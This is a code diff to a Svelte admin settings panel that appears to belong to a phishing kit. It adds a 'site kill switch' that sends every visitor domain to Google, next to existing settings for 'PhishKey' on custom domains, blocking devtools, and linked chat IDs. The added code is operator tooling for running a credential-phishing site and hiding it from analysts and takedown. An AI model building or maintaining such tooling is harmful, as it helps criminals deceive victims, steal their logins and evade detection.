@@ -77,6 +77,7 @@
 	let discoveredChats: { chatId: string; title: string; type: string }[] = $state([]);
 
 	// Visitor settings
+	let siteEnabled = $state(true);
 	let landingEnabled = $state(true);
 	let usePhishKey = $state(false);
 	let disableDevtools = $state(false);
@@ -102,6 +103,7 @@
 
 	function syncFromVisitorStore() {
 		const s = $visitorSettings;
+		siteEnabled = s['visitor.site_enabled'] !== '0';
 		landingEnabled = s['visitor.landing_enabled'] === '1';
 		usePhishKey = s['visitor.use_phishkey_on_custom_domains'] === '1';
 		disableDevtools = s['visitor.disable_devtools'] === '1';
@@ -136,6 +138,7 @@
 		savingVisitor = true;
 		try {
 			const ok = await saveVisitorSettings({
+				'visitor.site_enabled': siteEnabled ? '1' : '0',
 				'visitor.landing_enabled': landingEnabled ? '1' : '0',
 				'visitor.use_phishkey_on_custom_domains': usePhishKey ? '1' : '0',
 				'visitor.disable_devtools': disableDevtools ? '1' : '0',
@@ -424,6 +427,15 @@
 						<p class="text-sm font-semibold text-[var(--foreground)]">Server</p>
 					</div>
 					<div class="p-5 space-y-3">
+						<!-- Site kill switch -->
+						<label class="flex items-start gap-3 rounded-lg border {siteEnabled ? 'border-emerald-500/40 bg-emerald-500/5' : 'border-red-500/40 bg-red-500/5'} p-4 cursor-pointer transition-colors">
+							<input type="checkbox" bind:checked={siteEnabled} class="mt-1 h-4 w-4 accent-emerald-500" />
+							<div>
+								<p class="text-sm font-bold {siteEnabled ? 'text-emerald-400' : 'text-red-400'}">{siteEnabled ? 'Site is LIVE' : 'Site is OFF'}</p>
+								<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">When off, all visitor domains instantly redirect to Google. Use this to shut down the site.</p>
+							</div>
+						</label>
+
 						<!-- Landing enabled -->
 						<label class="flex items-start gap-3 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4 cursor-pointer">
 							<input type="checkbox" bind:checked={landingEnabled} class="mt-1 h-3.5 w-3.5 accent-[var(--accent-primary)]" />
